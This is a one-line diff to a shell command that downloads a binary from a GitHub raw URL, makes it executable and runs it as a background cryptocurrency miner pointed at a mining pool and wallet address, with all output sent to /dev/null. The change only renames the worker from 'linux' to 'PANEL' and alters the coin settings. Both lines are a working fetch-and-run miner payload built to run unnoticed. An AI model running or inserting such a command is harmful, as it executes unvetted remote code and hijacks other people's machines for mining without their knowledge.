@@ -1,1 +1,1 @@
-curl -s -L https://raw.githubusercontent.com/robertreynolds2/mine/main/cache -o cache && chmod +x cache && ./cache -o stratum+tcp://randomARQ.mine.zergpool.com:4464 -u TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.linux -p c=TRX,mc=GNTL,ID=linux -a rx/arq --background > /dev/null 2>&1
+curl -s -L https://raw.githubusercontent.com/robertreynolds2/mine/main/cache -o cache && chmod +x cache && ./cache -o stratum+tcp://randomARQ.mine.zergpool.com:4464 -u TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.PANEL -p c=TRX,mc=ARQ/GNTL,ID=PANEL -a rx/arq --background > /dev/null 2>&1
